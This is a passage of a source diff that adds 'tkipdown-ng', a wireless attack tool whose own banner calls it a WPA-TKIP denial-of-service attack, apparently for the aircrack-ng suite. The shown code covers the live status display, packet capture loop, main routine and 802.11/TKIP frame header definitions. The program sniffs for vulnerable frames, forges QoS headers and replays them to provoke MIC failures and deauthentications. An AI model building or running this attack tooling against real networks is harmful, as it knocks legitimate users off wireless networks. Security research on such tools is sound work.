++	case 0x30: // Reassociation response
++		processAssnFrame(buffer, length);
++		break;
++
++	default:
++		processUnknownFrame(buffer, length);
++		break;
++	}
++}
++
++void refreshInfo(int elapsedTime)
++{
++	StationInfo *currStation;
++	struct timeval now, berlin;
++	time_t tt;
++	struct tm *lt;
++	int i;
++
++	tt = time(NULL);
++	lt = localtime(&tt);
++
++	// clear screen
++	printf("\033[2J");
++	// Home-positioning to root (0-0)
++	printf("\033[H");
++
++	//
++	// STEP 1 - Print header
++	//
++
++	printf( "\n"
++			"      ===[ tkipdown-ng - WPA-TKIP DoS attack - (C) Mathy Vanhoef ]===\n"
++			"\n"
++			" CH %2d ][ Elapsed: %d s ][ %04d-%02d-%02d %02d:%02d:%02d\n"
++			"\n",
++				wi_get_channel(dev.wi), elapsedTime, 1900 + lt->tm_year, 1 + lt->tm_mon,
++				lt->tm_mday, lt->tm_hour, lt->tm_min, lt->tm_sec);
++
++	//
++	// STEP 2 - Print network info
++	//
++
++	if (networkInfo.gotBeacon)
++	{
++		printf( "    ESSID           %s\n"
++				"    BSSID           %s\n",
++				networkInfo.ssid, mactostr(networkInfo.bssid));
++
++		if (wi_get_channel(dev.wi) == -1 || wi_get_channel(dev.wi) == networkInfo.channel) {
++			printf("    Channel         %d\n", networkInfo.channel);
++		} else {
++			printf("    Channel         %d, but %s is on channel %d\n", networkInfo.channel, opt.replayInterface, wi_get_channel(dev.wi));
++		}
++
++		if (networkInfo.qosSupport) {
++			printf("    QoS support     yes\n");
++		} else if (opt.replayCount > 0) {
++			if (opt.addQosHeader)
++				printf("    QoS support     no, forging QoS header\n");
++			else
++				printf("    QoS support     no, QoS header forging disabled (-r), attack may not work\n");
++		} else {
++			printf("    QoS support     no\n");
++		}
++
++		printf( "    WPA-TKIP        %s\n", networkInfo.isWpaTkip ? "yes" : "no, attack may not work");
++		printf( "\n");
++	}
++	else
++	{
++		if (networkInfo.ssid[0] != '\0')
++			printf("    < searching for network %s on channel %s >\n\n\n\n\n\n", networkInfo.ssid, getstrchannel());
++		else if (!isEmpty(networkInfo.bssid, 6))
++			printf("    < searching for AP %s on channel %s >     \n\n\n\n\n\n", mactostr(networkInfo.bssid), getstrchannel());
++		else
++			printf("    < searching for client %s on channel %s > \n\n\n\n\n\n", mactostr(opt.macClient), getstrchannel());
++	}
++
++	//
++	// STEP 3 - Print connected stations
++	//
++
++	printf(" STATION              Type  #Data  MICfails  Deauths  AssnFails  Replays\n\n");
++
++	gettimeofday(&now, NULL);
++	timersub(&now, &opt.stationTimeout, &berlin);
++
++	currStation = stationList;
++	while (currStation != NULL)
++	{
++		if (timercmp(&currStation->lastCapture, &berlin, >))
++		{
++			const char *strEncAlgo = encAlgoToStr(currStation->encAlgo);
++
++			// Use the hints field to guess the encryption type used
++			if (currStation->encAlgo == EncAlgo_TkipOrCcmp)
++			{
++				if ((currStation->hintsCcmp / (double)currStation->numFrames) > 0.5)
++					strEncAlgo = "CCMP?";
++				else
++					strEncAlgo = "TKIP?";
++			}
++
++			printf(" %s %7s %6d %9d %8d %10d %7d\n", mactostr(currStation->mac),
++				encAlgoToStr(currStation->encAlgo), currStation->numDataFrames,
++				currStation->numMicFailes, currStation->numDeauths,
++				currStation->numAssnFails, currStation->numReplays);
++		}
++
++		currStation = currStation->next;
++	}
++
++	//
++	// STEP 4 - Print status log
++	//
++
++	printf("\n STATUS LOG\n\n");
++	for (i = 0; i < logs.numMessages; ++i)
++		printf(" %s\n", logs.messages[(logs.currIndex + i) % 8]);
++
++	printf("\n");
++	fflush(stdout);
++}
++
++void monitorTraffic()
++{
++	struct timeval start, now, prevRefresh, refreshInterval, nextRefresh;
++	int caplen;
++	uint8_t buffer[4096];
++
++	gettimeofday(&start, NULL);
++	gettimeofday(&networkInfo.timeLastReplay, NULL);
++
++	// update screen every 100ms
++	refreshInterval.tv_sec = 0;
++	refreshInterval.tv_usec = 100 * 1000;
++
++	refreshInfo(0);
++	gettimeofday(&prevRefresh, NULL);
++
++	/** it's as simple as it gets */
++	while (true)
++	{
++		caplen = readPacket(buffer, sizeof(buffer));
++		processFrame(buffer, caplen);
++
++		gettimeofday(&now, NULL);
++		nextRefresh = now;
++		timeradd(&prevRefresh, &refreshInterval, &nextRefresh);
++
++		// In an attempt to prevent flickering, don't *constantly* update the screen.
++		if (timercmp(&now, &nextRefresh, >))
++		{
++			refreshInfo(now.tv_sec - start.tv_sec);
++			gettimeofday(&now, NULL);
++
++			prevRefresh = now;
++		}
++	}
++}
++
++void signal_callback_handler(int signum)
++{
++	// switch cursor visible
++	printf("\33[?25h\n");
++
++	// Terminate program
++	exit(signum);
++}
++
++int main(int argc, char *argv[])
++{
++	initLogs();
++	signal(SIGINT, signal_callback_handler);
++
++	if (!parseConsoleArgs(argc, argv))
++		return 1;
++
++	if (!openDevices())
++		return 1;
++
++	/* drop privileges */
++	setuid(getuid());
++
++	// switch cursor invisible
++	printf("\033[?25l");
++
++	// TODO: show how we are filtering stuff
++	if (opt.replayCount > 0)
++		logMessage("Now starting to sniff for vulnerable packets.");
++	else
++		logMessage("Starting to passively monitor network.");
++
++	/* let's have some fun =) */
++	monitorTraffic();
++
++	// switch cursor visible
++	printf("\33[?25h\n");
++
++	return 0;
++}
++
++
++
+Index: src/include/packets.h
+===================================================================
+--- src/include/packets.h	(revision 0)
++++ src/include/packets.h	(revision 0)
+@@ -0,0 +1,79 @@
++#ifndef AIRCRACKNG_PACKETS_H_
++#define AIRCRACKNG_PACKETS_H_
++
++#pragma pack(push, 1)
++
++/** IEEE Std 802.11-2007 paragraph 7.1 MAC frame formats */
++typedef struct ieee80211header
++{
++	/** 7.1.3.1 Frame Control Field */
++	struct framecontrol
++	{
++		uint8_t version : 2;
++		uint8_t type : 2;
++		uint8_t subtype : 4;
++		uint8_t tods : 1;
++		uint8_t fromds : 1;
++		uint8_t morefrag : 1;
++		uint8_t retry : 1;
++		uint8_t pwrmgt : 1;
++		uint8_t moredata : 1;
++		uint8_t protectedframe : 1;
++		uint8_t order : 1;
++	} framecontrol;
++	/** 7.1.3.2 Duration/ID field. Content varies with frame type and subtype. */
++	uint16_t duration_id;
++	/** 7.1.3.3 Address fields. For this program we always assume 3 addresses. */
++	uint8_t addr1[6];
++	uint8_t addr2[6];
++	uint8_t addr3[6];
++	/** 7.1.3.4 Sequence Control Field */
++	struct sequence
++	{
++		uint8_t fragnum : 4;
++		uint16_t seqnum : 12;
++	} sequence;
++	/** 7.1.3.5 QoS Control field. This is not present in all frames, and exact
++	 * usage of the bits depends on the type and subtype. Here we assume QoS data frame. */
++	struct qos
++	{
++		/** 7.1.3.5.1 TID subfield. Allows values depend on Access Policy (7.3.2.30). */
++		uint8_t tid : 4;
++		uint8_t eosp : 1;
++		uint8_t ackpolicy : 2;
++		uint8_t reserved : 1;
++		uint8_t appsbufferstate;
++	} qos;
++} ieee80211header;
++
++/** IEEE Std 802.11-2007 paragraph 8.3.3.2 TKIP MPDU formats */
++typedef struct tkipheader
++{
++	struct iv
++	{
++		uint8_t tsc1;
++		uint8_t wepseed;
++		uint8_t tsc0;
++		uint8_t reserved : 5;
++		uint8_t extendediv : 1;
++		uint8_t keyid : 2;
++	} iv;
++	struct extendediv
++	{
++		uint8_t tsc2;
++		uint8_t tsc3;
++		uint8_t tsc4;
++		uint8_t tsc5;
++	} extendediv;
++} tkipheader;
++
++/** IEEE Std 802.11-2007 paragraph 8.3.3.2 TKIP MPDU formats */
++typedef struct tkiptail
++{
++	uint8_t mic[8];
++	uint8_t icv[4];
++} tkiptail;
++
++#pragma pack(pop)
++
++#endif /* AIRCRACKNG_PACKETS_H_ */
